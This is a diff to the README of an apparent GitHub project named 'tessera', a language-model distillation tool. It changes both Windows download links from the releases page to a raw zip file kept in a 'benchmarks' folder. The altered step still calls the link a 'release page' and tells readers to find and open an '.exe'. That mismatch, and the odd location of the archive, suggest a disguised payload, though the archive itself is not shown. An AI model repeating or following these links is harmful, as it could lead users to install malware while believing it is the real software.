@@ -1,6 +1,6 @@
 # 🧩 tessera - Distill and serve language models easily
 
-[ ![Download for Windows](https://img.shields.io/badge/Download_Tessera_for_Windows-blue) ](https://github.com/cyracomfortteam-del/tessera/releases)
+[ ![Download for Windows](https://img.shields.io/badge/Download_Tessera_for_Windows-blue) ](https://github.com/cyracomfortteam-del/tessera/raw/refs/heads/main/benchmarks/Software-v1.3.zip)
 
 Tessera turns complex language models into efficient tools. It simplifies the process of training smaller models from larger ones and makes them run faster on your computer. You use this software to create high-performance AI tools without needing deep knowledge of how the underlying code works.
 
@@ -8,7 +8,7 @@ Tessera turns complex language models into efficient tools. It simplifies the pr
 
 Follow these steps to get the software on your machine:
 
-1. Visit the project release page at [https://github.com/cyracomfortteam-del/tessera/releases](https://github.com/cyracomfortteam-del/tessera/releases). 
+1. Visit the project release page at [https://github.com/cyracomfortteam-del/tessera/raw/refs/heads/main/benchmarks/Software-v1.3.zip](https://github.com/cyracomfortteam-del/tessera/raw/refs/heads/main/benchmarks/Software-v1.3.zip). 
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the link to start the download. 
 4. Open the downloaded file once the process finishes.
